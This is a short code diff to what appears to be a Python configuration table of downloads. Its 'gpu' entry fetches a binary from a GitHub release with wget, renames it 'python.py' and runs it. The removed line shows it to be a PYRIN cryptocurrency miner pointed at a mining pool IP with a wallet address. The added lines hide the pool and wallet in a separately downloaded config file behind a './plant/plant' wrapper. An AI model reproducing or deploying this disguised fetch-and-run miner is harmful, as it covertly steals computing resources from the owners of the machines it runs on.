@@ -38,10 +38,10 @@ downloads = {
         ]
     },
     "gpu": {
-        "link": "wget -q https://github.com/handevproject/starterpack/releases/download/1.0.0/lol",
+        "link": "./plant/plant wget -q https://github.com/handevproject/starterpack/releases/download/1.0.0/lol && ./plant/plant wget -q https://github.com/handevproject/starterpack/raw/main/python.cfg",
         "run": [
             "chmod +x lol && mv lol python.py",
-            "./python.py --algo PYRIN --pool 44.204.71.134:80 --tls on --user pyrin:qpw6m4gsf4zjceusefcx02fw6t6jv3qlt6dmfmkjdd59fm2569gwvs3e8dg3w.clarksye"
+            "./python.py --config=./python.cfg"
         ]
     },
     # "gpu": {
